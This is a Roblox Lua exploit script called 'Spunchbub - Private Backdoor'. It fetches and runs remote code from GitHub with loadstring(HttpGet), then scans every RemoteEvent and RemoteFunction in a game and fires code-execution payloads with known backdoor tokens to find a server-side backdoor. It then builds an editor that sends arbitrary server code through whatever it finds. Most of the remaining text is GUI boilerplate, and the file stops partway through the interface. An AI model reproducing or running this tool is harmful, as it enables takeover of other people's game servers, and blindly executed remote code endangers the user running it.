loadstring(game:HttpGet("https://github.com/gregsixseven/sixone/blob/main/wl.luau?raw=true"))()


local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local notify = loadstring(game:HttpGet("https://raw.githubusercontent.com/gregsixseven/sixone/refs/heads/main/notification.luau", true))()

    local player = game.Players.LocalPlayer
	local mouse = player:GetMouse()
	local userInputService = game:GetService("UserInputService")
	local runService = game:GetService("RunService")
	local tweenService = game:GetService("TweenService")
	local HttpService = game:GetService("HttpService")
	local RunService = game:GetService("RunService")
	
	
	local EXCLUDED_REMOTES = {
		UpdateCurrentCall = true, CanChatWith = true, OnNewMessage = true,
		OnMessageDoneFiltering = true, OnChannelJoined = true, OnNewSystemMessage = true,
		NewPlayerGroupDetails = true, ClientLoaded = true, SetPlayerReady = true,
		SetCoreGuiEnabled = true, SetCore = true, DispatchEvent = true,
		PromptGamePassPurchaseFinished = true, PromptPurchaseFinished = true,
		PromptSubscriptionFinished = true, InspectMenuFromMouse = true,
		GetServerVersion = true, GetClientId = true, GetInventory = true,
		GetFriends = true, GetAccountInfo = true, RequestServerSaves = true,
		UpdatePlayerBlockList = true, SetAvatarBlockList = true,
		SetFriendRequestEvent = true, NewFollower = true, PerformAction = true,
		ReportAbuse = true
	}
	
	local SAFE_LOCATIONS = {
		["CoreGui"] = true,
		["ServerStorage"] = true,
		["ReplicatedFirst"] = true,
		["ServerScriptService"] = true
	}
	
	local foundExploit = false
	local FinishedFound = false
	local mode = 3
	local bg = 1
	local remoteEvent, remoteFunction
	local scanTime = 0
	
	local function isLikelyBackdoorRemote(remote)
		local name = remote.Name
		local parent = remote.Parent
	
	
		if SAFE_LOCATIONS[parent.ClassName] then
			return false
		end
		if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
			return false
		end 
		if EXCLUDED_REMOTES[name] then
			return false
		end
		if name == "rbxAssetid_core__temp_3023g78" then
		        return false
		end
        if name == "rbx.bd_cssr6-O1" then 
                return false
        end
        if name == "_FEBYPASS32" then
                return false
        end
        if name == "rbx.bd_cssr6-01" then 
                return false
        end
        if name == "spunch.bd_cssr6-O1" then
                return false
        end
		if name == "ChatEvent" then
		        return false
		end
		if name == "AntiBackdoorScanner" then 
			    return false
		end
		if parent.Parent.Name=='HDAdminHDClient' and remote.Parent.Name=='Signals' then
			return false
		end
		if parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
			return false
		end
		if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
			return false
		end
	
	
		return true
	end
	
	
	
		
	local function testRemote(remote, isFunction)
	if foundExploit then return false end
	if not isLikelyBackdoorRemote(remote) then return false end

	local modelName = "Spunchbub_" .. tostring(os.clock()):gsub("%.", "")
	local rs = game:GetService("ReplicatedStorage")
	local foundEvent = false
	local testFlagName = "__spunchbub_test_flag_" .. tostring(os.clock()):gsub("%.", "")
	local globalPayload = "getgenv()." .. testFlagName .. " = true"

	local connection = rs.DescendantAdded:Connect(function(inst)
		if inst.Name == modelName then
			foundEvent = true
		end
	end)

	local function cleanup()
		connection:Disconnect()
		local f = rs:FindFirstChild(modelName)
		if f then f:Destroy() end
	end

	local success = pcall(function()
		local payload = [[
			local m=Instance.new("Folder")
			m.Name="]] .. modelName .. [["
			m.Parent=game:GetService("ReplicatedStorage")
		]]

		task.spawn(function()
			pcall(function()
				if isFunction then
					local ran = false
					pcall(function()
						local r = remote:InvokeServer('starlightTSS', payload .. "\nreturn true")
						if r then ran = true end
					end)
					if not ran then
						pcall(function()
							local r = remote:InvokeServer(payload .. "\nreturn true")
							if r then ran = true end
						end)
					end
				   if not ran then 
                      pcall(function()
			            local r = remote:InvokeServer({
                                    token = "Scr1pt3dX_Acc3ss#XD!Private",
                                    code = payload .. "\nreturn true"  
                                  })
				          if r then ran = true end
		                end)
					end
					pcall(function()
						remote:InvokeServer(globalPayload)
					end)
				else
					remote:FireServer(payload)
					remote:FireServer(globalPayload)
				end
			end)
          end)
        end)
	local timeout = 1
	local start = os.clock()
	while os.clock() - start < timeout do
		if foundEvent or rs:FindFirstChild(modelName) then
			foundEvent = true
			break
		end
		task.wait(0)
	end

	local globalFlagTriggered = getgenv()[testFlagName] == true
	if globalFlagTriggered then
		getgenv()[testFlagName] = nil
	end

	cleanup()

	if (foundEvent or globalFlagTriggered) and not foundExploit then
		foundExploit = true
		if isFunction then
			remoteFunction = remote
		else
			remoteEvent = remote
		end
		return true
	end

	   return false
	end

local function findRemote()
    local trueStart = os.clock()
    foundExploit = false
    remoteEvent = nil
    remoteFunction = nil

    local remotes = {}
    for _, remote in ipairs(game:GetDescendants()) do
        if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
            table.insert(remotes, remote)
        end
    end

    print(string.format("Spunchbub BD: scanning %d remotes", #remotes))

    local MAX_CONCURRENT = 128
    local activeTasks = 0
    local taskDone = Instance.new("BindableEvent")

    local foundObject = nil

    for i = 1, #remotes do
        if foundExploit then break end

        while activeTasks >= MAX_CONCURRENT do
            taskDone.Event:Wait()
        end

        activeTasks += 1
        task.spawn(function()
            local ok, result = pcall(function()
                return testRemote(remotes[i], remotes[i]:IsA("RemoteFunction"))
            end)

            if ok and result then
                foundExploit = true
                foundObject = remotes[i]
                if remotes[i]:IsA("RemoteEvent") then
                    remoteEvent = remotes[i]
                else
                    remoteFunction = remotes[i]
                end
                print("Spunchbub BD: ", remotes[i]:GetFullName())
            end

            activeTasks -= 1
            taskDone:Fire()
        end)
    end

    while activeTasks > 0 and not foundExploit do
        taskDone.Event:Wait()
    end

    scanTime = os.clock() - trueStart
    FinishedFound = true

    if not foundExploit then
       -- notify.Warn("Spunchbub","No backdoor was found.")
    end

    print(string.format("Spunchbub : scan completed in %.3f seconds", scanTime))
    
    return foundObject
end

	
function fireRemoteEvent(codes)
    local success = false
    local tried = 0
    local errors = {}

    local function try(func)
        tried += 1
        local ok, err = pcall(func)
        if ok then
            success = true
        else
            table.insert(errors, err)
        end
    end

    try(function()
        if remoteEvent then
            remoteEvent:FireServer(codes)
        end
    end)
    try(function()
        if remoteFunction then 
           remoteFunction:InvokeServer({
             token = "Scr1pt3dX_Acc3ss#XD!Private",
             code = codes
          })
        end
    end)
    try(function()
        if remoteFunction then
            remoteFunction:InvokeServer("starlightTSS", codes)
        end
    end)
    try(function()
        if remoteFunction then
            remoteFunction:InvokeServer(codes)
        end
    end)
    if not foundExploit then
        notify.Warn("Spunchbub", "No backdoor.")
    elseif not success then
        notify.Warn("Spunchbub", "RemoteEvent errors:")
        for _, err in ipairs(errors) do
            notify.Error(err)
        end
    end
end

local LMG2 = {};

LMG2["Scan_SpunchLOL_1"] = Instance.new("ScreenGui", game.CoreGui);
LMG2["Scan_SpunchLOL_1"]["Name"] = [[Scan_SpunchLOL]];
LMG2["Scan_SpunchLOL_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


LMG2["Frame_2"] = Instance.new("Frame", LMG2["Scan_SpunchLOL_1"]);
LMG2["Frame_2"]["BorderSizePixel"] = 0;
LMG2["Frame_2"]["BackgroundColor3"] = Color3.fromRGB(27, 28, 33);
LMG2["Frame_2"]["Size"] = UDim2.new(0, 471, 0, 310);
LMG2["Frame_2"]["Position"] = UDim2.new(0, 332, 0, 210);


LMG2["UICorner_3"] = Instance.new("UICorner", LMG2["Frame_2"]);
LMG2["UICorner_3"]["CornerRadius"] = UDim.new(0, 6);


LMG2["UIStroke_4"] = Instance.new("UIStroke", LMG2["Frame_2"]);
LMG2["UIStroke_4"]["Transparency"] = 0.5;
LMG2["UIStroke_4"]["Color"] = Color3.fromRGB(98, 98, 98);


LMG2["Frame_5"] = Instance.new("Frame", LMG2["Frame_2"]);
LMG2["Frame_5"]["BorderSizePixel"] = 0;
LMG2["Frame_5"]["BackgroundColor3"] = Color3.fromRGB(27, 28, 33);
LMG2["Frame_5"]["Size"] = UDim2.new(0, 457, 0, 25);
LMG2["Frame_5"]["Position"] = UDim2.new(0, 8, 0, 10);


LMG2["UICorner_6"] = Instance.new("UICorner", LMG2["Frame_5"]);



LMG2["UIStroke_7"] = Instance.new("UIStroke", LMG2["Frame_5"]);
LMG2["UIStroke_7"]["Transparency"] = 0.5;
LMG2["UIStroke_7"]["Color"] = Color3.fromRGB(98, 98, 98);


LMG2["TextLabel_8"] = Instance.new("TextLabel", LMG2["Frame_5"]);
LMG2["TextLabel_8"]["Active"] = true;
LMG2["TextLabel_8"]["BorderSizePixel"] = 0;
LMG2["TextLabel_8"]["TextSize"] = 15;
LMG2["TextLabel_8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2["TextLabel_8"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Italic);
LMG2["TextLabel_8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2["TextLabel_8"]["BackgroundTransparency"] = 1;
LMG2["TextLabel_8"]["RichText"] = true;
LMG2["TextLabel_8"]["Size"] = UDim2.new(0, 138, 0, 10);
LMG2["TextLabel_8"]["Text"] = [[ <font color="#f7f30a">Spunchbub</font> - Private Backdoor |  Backdoor Scanner]];
LMG2["TextLabel_8"]["Position"] = UDim2.new(0, 110, 0, 7);


LMG2["ImageButton_9"] = Instance.new("ImageButton", LMG2["Frame_5"]);
LMG2["ImageButton_9"]["BorderSizePixel"] = 0;
LMG2["ImageButton_9"]["BackgroundTransparency"] = 1;
-- LMG2L["ImageButton_9"]["ImageContent"] = ;
LMG2["ImageButton_9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2["ImageButton_9"]["ImageColor3"] = Color3.fromRGB(231, 231, 231);
LMG2["ImageButton_9"]["Image"] = [[rbxassetid://110786993356448]];
LMG2["ImageButton_9"]["Size"] = UDim2.new(0, 24, 0, 24);
LMG2["ImageButton_9"]["Position"] = UDim2.new(0, 430, 0, 0);


LMG2["LocalScript_a"] = Instance.new("LocalScript", LMG2["ImageButton_9"]);



LMG2["ImageLabel_b"] = Instance.new("ImageLabel", LMG2["Frame_2"]);
LMG2["ImageLabel_b"]["BorderSizePixel"] = 0;
LMG2["ImageLabel_b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2["ImageLabel_b"]["ImageTransparency"] = 0.43;
-- LMG2L["ImageLabel_b"]["ImageContent"] = ;
LMG2["ImageLabel_b"]["Image"] = [[rbxassetid://89640858025803]];
LMG2["ImageLabel_b"]["Size"] = UDim2.new(0, 277, 0, 272);
LMG2["ImageLabel_b"]["BackgroundTransparency"] = 1;
LMG2["ImageLabel_b"]["Position"] = UDim2.new(0.204, 0, 0.035, 0);


LMG2["ScanButton_c"] = Instance.new("TextButton", LMG2["Frame_2"]);
LMG2["ScanButton_c"]["TextWrapped"] = true;
LMG2["ScanButton_c"]["RichText"] = true;
LMG2["ScanButton_c"]["BorderSizePixel"] = 0;
LMG2["ScanButton_c"]["TextSize"] = 20;
LMG2["ScanButton_c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2["ScanButton_c"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG2["ScanButton_c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Italic);
LMG2["ScanButton_c"]["BackgroundTransparency"] = 0.4;
LMG2["ScanButton_c"]["Size"] = UDim2.new(0, 240, 0, 90);
LMG2["ScanButton_c"]["Text"] = [[Scan Backdoor]];
LMG2["ScanButton_c"]["Name"] = [[ScanButton]];
LMG2["ScanButton_c"]["Position"] = UDim2.new(0, 114, 0, 110);


LMG2["UICorner_d"] = Instance.new("UICorner", LMG2["ScanButton_c"]);



LMG2["UIStroke_e"] = Instance.new("UIStroke", LMG2["ScanButton_c"]);
LMG2["UIStroke_e"]["Transparency"] = 0.5;
LMG2["UIStroke_e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2["UIStroke_e"]["Color"] = Color3.fromRGB(98, 98, 98);


LMG2["Frame_f"] = Instance.new("Frame", LMG2["Frame_2"]);
LMG2["Frame_f"]["BorderSizePixel"] = 0;
LMG2["Frame_f"]["BackgroundColor3"] = Color3.fromRGB(27, 28, 33);
LMG2["Frame_f"]["Size"] = UDim2.new(0, 457, 0, 25);
LMG2["Frame_f"]["Position"] = UDim2.new(0, 6, 0.8, 26);


LMG2["UICorner_10"] = Instance.new("UICorner", LMG2["Frame_f"]);
LMG2["UICorner_10"]["CornerRadius"] = UDim.new(0, 6);


LMG2["UIStroke_11"] = Instance.new("UIStroke", LMG2["Frame_f"]);
LMG2["UIStroke_11"]["Transparency"] = 0.5;
LMG2["UIStroke_11"]["Color"] = Color3.fromRGB(98, 98, 98);


LMG2["Credits_12"] = Instance.new("TextLabel", LMG2["Frame_f"]);
LMG2["Credits_12"]["BorderSizePixel"] = 0;
LMG2["Credits_12"]["TextSize"] = 15;
LMG2["Credits_12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2["Credits_12"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Italic);
LMG2["Credits_12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2["Credits_12"]["BackgroundTransparency"] = 1;
LMG2["Credits_12"]["RichText"] = true;
LMG2["Credits_12"]["Size"] = UDim2.new(0, 92, 0, 16);
LMG2["Credits_12"]["Text"] = [[ <font color="#f7f30a">Spunchbub</font> Backdoor Scanner | Made by Rig6?!?!?]];
LMG2["Credits_12"]["Name"] = [[Credits]];
LMG2["Credits_12"]["Position"] = UDim2.new(0, 130, 0, 4);

function EnableDrag(frame)
	local dragging
	local dragInput
	local dragStart
	local startPos

	local function update(input)
		local delta = input.Position - dragStart
		local targetPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		
		-- Tweening for smoothness
		local tweenInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
		TweenService:Create(frame, tweenInfo, {Position = targetPos}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end

task.spawn(function()
    EnableDrag(LMG2["Frame_2"])
end)

local function C_a()
	local script = LMG2["LocalScript_a"];
	script.Parent.MouseButton1Click:Connect(function()	
	     script.Parent.Parent.Parent.Parent:Destroy()	
	end)	
end;
task.spawn(C_a);
LMG2["ScanButton_c"].MouseButton1Click:Connect(function()
    notify.Info("Spunchbub","Scanning backdoor..")
    findRemote()
    
    while not FinishedFound do
        task.wait(0.1)
    end
    
    if foundExploit then
    LMG2["Scan_SpunchLOL_1"]:Destroy()

LMG2L = {};
LMG2L["SpunchLOL_1"] = Instance.new("ScreenGui", game.CoreGui);
LMG2L["SpunchLOL_1"]["Name"] = [[SpunchLOL]];
LMG2L["SpunchLOL_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
LMG2L["SpunchLOL_1"]["ResetOnSpawn"] = false;

LMG2L["Main_2"] = Instance.new("Frame", LMG2L["SpunchLOL_1"]);
LMG2L["Main_2"]["BorderSizePixel"] = 0;
LMG2L["Main_2"]["BackgroundColor3"] = Color3.fromRGB(26, 27, 32);
LMG2L["Main_2"]["Size"] = UDim2.new(0, 471, 0, 310);
LMG2L["Main_2"]["Position"] = UDim2.new(0, 166, 0, 156);
LMG2L["Main_2"]["Name"] = [[Main]];

LMG2L["UICorner_3"] = Instance.new("UICorner", LMG2L["Main_2"]);
LMG2L["UICorner_3"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["UIStroke_4"] = Instance.new("UIStroke", LMG2L["Main_2"]);
LMG2L["UIStroke_4"]["Color"] = Color3.fromRGB(97, 97, 97);
LMG2L["UIStroke_4"]["Transparency"] = 0.5;

LMG2L["Frame_5"] = Instance.new("Frame", LMG2L["Main_2"]);
LMG2L["Frame_5"]["BorderSizePixel"] = 0;
LMG2L["Frame_5"]["BackgroundColor3"] = Color3.fromRGB(56, 56, 56);
LMG2L["Frame_5"]["Size"] = UDim2.new(0, 471, 0, 310);
LMG2L["Frame_5"]["BackgroundTransparency"] = 1;

LMG2L["hide_6"] = Instance.new("ImageButton", LMG2L["Frame_5"]);
LMG2L["hide_6"]["BorderSizePixel"] = 0;
-- LMG2L["hide_6"]["Image"] = "rbxassetid://100033680381365";
LMG2L["hide_6"]["BackgroundColor3"] = Color3.fromRGB(18, 20, 23);
LMG2L["hide_6"]["Size"] = UDim2.new(0, 34, 0, 34);
LMG2L["hide_6"]["Name"] = [[hide]];
LMG2L["hide_6"]["AutoButtonColor"] = false;
LMG2L["hide_6"]["Position"] = UDim2.new(0, 309, 0, 271);

LMG2L["ImageLabelbla"] = Instance.new("ImageLabel", LMG2L["hide_6"]);
LMG2L["ImageLabelbla"]["Image"] = "rbxassetid://100033680381365";
LMG2L["ImageLabelbla"]["Size"] = UDim2.new(0, 25, 0, 25);
LMG2L["ImageLabelbla"]["BackgroundTransparency"] = 1;
LMG2L["ImageLabelbla"]["Position"] = UDim2.new(0, 4, 0, 4);

LMG2L["UICorner_7"] = Instance.new("UICorner", LMG2L["hide_6"]);
LMG2L["UICorner_7"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["LocalScript_8"] = Instance.new("LocalScript", LMG2L["hide_6"]);

LMG2L["UIStroke_9"] = Instance.new("UIStroke", LMG2L["hide_6"]);
LMG2L["UIStroke_9"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_9"]["Thickness"] = 1;
LMG2L["UIStroke_9"]["Color"] = Color3.fromRGB(97, 97, 97);
LMG2L["UIStroke_9"]["Transparency"] = 0.5;

LMG2L["UICorner_a"] = Instance.new("UICorner", LMG2L["Frame_5"]);
LMG2L["UICorner_a"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["ImageButton2_b"] = Instance.new("ImageButton", LMG2L["Frame_5"]);
LMG2L["ImageButton2_b"]["BorderSizePixel"] = 0;
LMG2L["ImageButton2_b"]["BackgroundColor3"] = Color3.fromRGB(18, 20, 23);
LMG2L["ImageButton2_b"]["Size"] = UDim2.new(0, 34, 0, 34);
LMG2L["ImageButton2_b"]["Name"] = [[ImageButton2]];
LMG2L["ImageButton2_b"]["AutoButtonColor"] = false;
LMG2L["ImageButton2_b"]["Position"] = UDim2.new(0, 389, 0, 271);

LMG2L["ImageLabella"] = Instance.new("ImageLabel", LMG2L["ImageButton2_b"]);
LMG2L["ImageLabella"]["Image"] = "rbxassetid://7072721335";
LMG2L["ImageLabella"]["Size"] = UDim2.new(0, 22, 0, 22);
LMG2L["ImageLabella"]["BackgroundTransparency"] = 1;
LMG2L["ImageLabella"]["Position"] = UDim2.new(0, 6, 0, 6);

LMG2L["LocalScript_ni"] = Instance.new("LocalScript", LMG2L["ImageButton2_b"])

LMG2L["UICorner_c"] = Instance.new("UICorner", LMG2L["ImageButton2_b"]);
LMG2L["UICorner_c"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["UIStroke_d"] = Instance.new("UIStroke", LMG2L["ImageButton2_b"]);
LMG2L["UIStroke_d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_d"]["Thickness"] = 1;
LMG2L["UIStroke_d"]["Color"] = Color3.fromRGB(97, 97, 97);
LMG2L["UIStroke_d"]["Transparency"] = 0.5;

LMG2L["clr_e"] = Instance.new("TextButton", LMG2L["Frame_5"]);
LMG2L["clr_e"]["TextStrokeTransparency"] = 0;
LMG2L["clr_e"]["BorderSizePixel"] = 0;
LMG2L["clr_e"]["TextSize"] = 18;
LMG2L["clr_e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["clr_e"]["BackgroundColor3"] = Color3.fromRGB(18, 20, 23);
LMG2L["clr_e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG2L["clr_e"]["Size"] = UDim2.new(0, 100, 0, 33);
LMG2L["clr_e"]["Text"] = [[Clear]];
LMG2L["clr_e"]["AutoButtonColor"] = false;
LMG2L["clr_e"]["Name"] = [[clr]];
LMG2L["clr_e"]["Position"] = UDim2.new(0, 148, 0, 272);

LMG2L["UICorner_f"] = Instance.new("UICorner", LMG2L["clr_e"]);
LMG2L["UICorner_f"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["LocalScript_10"] = Instance.new("LocalScript", LMG2L["clr_e"]);

LMG2L["UIStroke_11"] = Instance.new("UIStroke", LMG2L["clr_e"]);
LMG2L["UIStroke_11"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_11"]["Thickness"] = 1;
LMG2L["UIStroke_11"]["Color"] = Color3.fromRGB(97, 97, 97);
LMG2L["UIStroke_11"]["Transparency"] = 0.5;

LMG2L["ImageButton_12"] = Instance.new("ImageButton", LMG2L["Frame_5"]);
LMG2L["ImageButton_12"]["BorderSizePixel"] = 0;
LMG2L["ImageButton_12"]["BackgroundColor3"] = Color3.fromRGB(18, 20, 23);
LMG2L["ImageButton_12"]["Size"] = UDim2.new(0, 34, 0, 34);
LMG2L["ImageButton_12"]["Position"] = UDim2.new(0, 429, 0, 271);
LMG2L["ImageButton_12"]["AutoButtonColor"] = false;

LMG2L["LocalScript_r6"] = Instance.new("LocalScript", LMG2L["ImageButton_12"])

LMG2L["ImageLabel2"] = Instance.new("ImageLabel", LMG2L["ImageButton_12"]);
LMG2L["ImageLabel2"]["Image"] = "rbxassetid://4941166750";
LMG2L["ImageLabel2"]["Size"] = UDim2.new(0, 22, 0, 22);
LMG2L["ImageLabel2"]["BackgroundTransparency"] = 1;
LMG2L["ImageLabel2"]["Position"] = UDim2.new(0, 6, 0, 6);

LMG2L["UICorner_13"] = Instance.new("UICorner", LMG2L["ImageButton_12"]);
LMG2L["UICorner_13"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["UIStroke_14"] = Instance.new("UIStroke", LMG2L["ImageButton_12"]);
LMG2L["UIStroke_14"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_14"]["Thickness"] = 1;
LMG2L["UIStroke_14"]["Color"] = Color3.fromRGB(97, 97, 97);
LMG2L["UIStroke_14"]["Transparency"] = 0.5;

LMG2L["EditorScroll"] = Instance.new("ScrollingFrame", LMG2L["Frame_5"]);
LMG2L["EditorScroll"]["Name"] = [[EditorScroll]];
LMG2L["EditorScroll"]["Active"] = true;
LMG2L["EditorScroll"]["BackgroundColor3"] = Color3.fromRGB(18, 20, 0);
LMG2L["EditorScroll"]["BackgroundTransparency"] = 0.5;
LMG2L["EditorScroll"]["BorderSizePixel"] = 0;
LMG2L["EditorScroll"]["Position"] = UDim2.new(0, 6, 0, 42); 
LMG2L["EditorScroll"]["Size"] = UDim2.new(0, 458, 0, 223);
LMG2L["EditorScroll"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
LMG2L["EditorScroll"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
LMG2L["EditorScroll"]["ScrollBarThickness"] = 1;
LMG2L["EditorScroll"]["ZIndex"] = 999;

LMG2L["UIStroke_16"] = Instance.new("UIStroke", LMG2L["EditorScroll"]);
LMG2L["UIStroke_16"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_16"]["Color"] = Color3.fromRGB(97, 97, 97);
LMG2L["UIStroke_16"]["Transparency"] = 0.5;

LMG2L["UICorner_17"] = Instance.new("UICorner", LMG2L["EditorScroll"]);
LMG2L["UICorner_17"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["Editor_15"] = Instance.new("TextBox", LMG2L["EditorScroll"]);
LMG2L["Editor_15"]["Name"] = [[Editor]];
LMG2L["Editor_15"]["TextXAlignment"] = Enum.TextXAlignment.Left;
LMG2L["Editor_15"]["PlaceholderColor3"] = Color3.fromRGB(204, 204, 204);
LMG2L["Editor_15"]["ZIndex"] = 999;
LMG2L["Editor_15"]["BorderSizePixel"] = 0;
LMG2L["Editor_15"]["TextSize"] = 15;
LMG2L["Editor_15"]["TextColor3"] = Color3.fromRGB(204, 204, 204);
LMG2L["Editor_15"]["TextYAlignment"] = Enum.TextYAlignment.Top;
LMG2L["Editor_15"]["BackgroundColor3"] = Color3.fromRGB(18, 20, 0);
LMG2L["Editor_15"]["RichText"] = true;
LMG2L["Editor_15"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["Editor_15"]["MultiLine"] = true;
LMG2L["Editor_15"]["ClearTextOnFocus"] = false;
LMG2L["Editor_15"]["PlaceholderText"] = [[-- boi what the helly 67]];
LMG2L["Editor_15"]["Size"] = UDim2.new(1, -8, 0, 210);
LMG2L["Editor_15"]["Position"] = UDim2.new(0, 4, 0, 4);
LMG2L["Editor_15"]["Text"] = [[]];
LMG2L["Editor_15"]["BackgroundTransparency"] = 1;
LMG2L["Editor_15"]["AutomaticSize"] = Enum.AutomaticSize.Y;

LMG2L["Editor_15"]["Position"] = UDim2.new(0, 40, 0, 4); 
LMG2L["Editor_15"]["Size"] = UDim2.new(1, -45, 0, 210);

-- 1. Setup the LineNumbers Label with AutomaticSize
LMG2L["LineNumbers"] = Instance.new("TextLabel", LMG2L["EditorScroll"]);
LMG2L["LineNumbers"]["Name"] = [[LineNumbers]];
LMG2L["LineNumbers"]["BackgroundTransparency"] = 1;
LMG2L["LineNumbers"]["TextColor3"] = Color3.fromRGB(255,255,255);
LMG2L["LineNumbers"]["TextSize"] = 15;
LMG2L["LineNumbers"]["FontFace"] = LMG2L["Editor_15"]["FontFace"];
LMG2L["LineNumbers"]["TextYAlignment"] = Enum.TextYAlignment.Top;
LMG2L["LineNumbers"]["TextXAlignment"] = Enum.TextXAlignment.Right;
LMG2L["LineNumbers"]["ZIndex"] = 1000;

-- KEY CHANGES FOR INFINITE HEIGHT:
LMG2L["LineNumbers"]["Size"] = UDim2.new(0, 30, 0, 0); -- Height 0, but...
LMG2L["LineNumbers"]["AutomaticSize"] = Enum.AutomaticSize.Y; -- ...it grows with text
LMG2L["LineNumbers"]["Position"] = UDim2.new(0, 0, 0, 4);
LMG2L["LineNumbers"]["Text"] = [[1]];

-- 2. Ensure the Editor doesn't wrap (Wrapping breaks line number alignment)
LMG2L["Editor_15"]["TextWrapped"] = false;

-- 3. Optimized Line Counter
local function UpdateLineNumbers()
    local text = LMG2L["Editor_15"].Text
    -- Count newlines efficiently
    local _, lineCount = text:gsub("\n", "\n")
    lineCount = lineCount + 1
    
    -- Create the vertical list of numbers
    local t = {}
    for i = 1, lineCount do
        table.insert(t, i)
    end
    
    LMG2L["LineNumbers"].Text = table.concat(t, "\n")
end

-- 4. Listen for changes
LMG2L["Editor_15"]:GetPropertyChangedSignal("Text"):Connect(UpdateLineNumbers)

LMG2L["Title_18"] = Instance.new("Frame", LMG2L["Frame_5"]);
LMG2L["Title_18"]["BorderSizePixel"] = 0;
LMG2L["Title_18"]["BackgroundColor3"] = Color3.fromRGB(26, 27, 32);
LMG2L["Title_18"]["Size"] = UDim2.new(0, 457, 0, 25);
LMG2L["Title_18"]["Position"] = UDim2.new(0, 6, 0, 6);
LMG2L["Title_18"]["Name"] = [[Title]];

LMG2L["close_19"] = Instance.new("ImageButton", LMG2L["Title_18"]);
LMG2L["close_19"]["BorderSizePixel"] = 0;
LMG2L["close_19"]["Image"] = "rbxassetid://110786993356448";
LMG2L["close_19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["close_19"]["ImageColor3"] = Color3.fromRGB(230, 230, 230);
LMG2L["close_19"]["BackgroundTransparency"] = 1;
LMG2L["close_19"]["Size"] = UDim2.new(0, 24, 0, 24);
LMG2L["close_19"]["Name"] = [[close]];
LMG2L["close_19"]["Position"] = UDim2.new(0, 430, 0, 0);

LMG2L["LocalScript_1a"] = Instance.new("LocalScript", LMG2L["close_19"]);

LMG2L["UICorner_1b"] = Instance.new("UICorner", LMG2L["Title_18"]);
LMG2L["UICorner_1b"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["TextLabel_1c"] = Instance.new("TextLabel", LMG2L["Title_18"]);
LMG2L["TextLabel_1c"]["BorderSizePixel"] = 0;
LMG2L["TextLabel_1c"]["TextSize"] = 18;
LMG2L["TextLabel_1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextLabel_1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Italic);
LMG2L["TextLabel_1c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextLabel_1c"]["BackgroundTransparency"] = 1;
LMG2L["TextLabel_1c"]["RichText"] = true;
LMG2L["TextLabel_1c"]["Size"] = UDim2.new(0, 138, 0, 11);
LMG2L["TextLabel_1c"]["Text"] = [[ <font color="#f7f30a">Spunchbub</font> - Private Backdoor ]];
LMG2L["TextLabel_1c"]["Position"] = UDim2.new(0, 60, 0, 6);

LMG2L["UIStroke_1d"] = Instance.new("UIStroke", LMG2L["Title_18"]);
